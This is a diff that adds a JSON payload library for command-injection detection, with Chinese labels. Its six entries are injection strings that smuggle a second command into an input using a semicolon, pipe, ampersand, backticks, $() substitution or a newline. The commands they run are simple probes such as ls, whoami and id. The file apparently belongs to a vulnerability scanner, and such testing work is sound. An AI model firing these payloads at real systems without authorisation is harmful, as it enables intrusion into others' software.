@@ -1,0 +1,43 @@
+{
+    "name": "命令注入payload库",
+    "description": "常见的命令注入检测payload",
+    "version": "1.0",
+    "payloads": [
+        {
+            "name": "分号分隔",
+            "payload": "; ls",
+            "type": "cmd",
+            "description": "Linux命令注入"
+        },
+        {
+            "name": "管道符",
+            "payload": "| whoami",
+            "type": "cmd",
+            "description": "管道符命令注入"
+        },
+        {
+            "name": "AND符号",
+            "payload": "& dir",
+            "type": "cmd",
+            "description": "Windows命令注入"
+        },
+        {
+            "name": "反引号",
+            "payload": "`id`",
+            "type": "cmd",
+            "description": "反引号命令执行"
+        },
+        {
+            "name": "$()",
+            "payload": "$(id)",
+            "type": "cmd",
+            "description": "$()命令替换"
+        },
+        {
+            "name": "换行符",
+            "payload": "\nid",
+            "type": "cmd",
+            "description": "换行符注入"
+        }
+    ]
+}
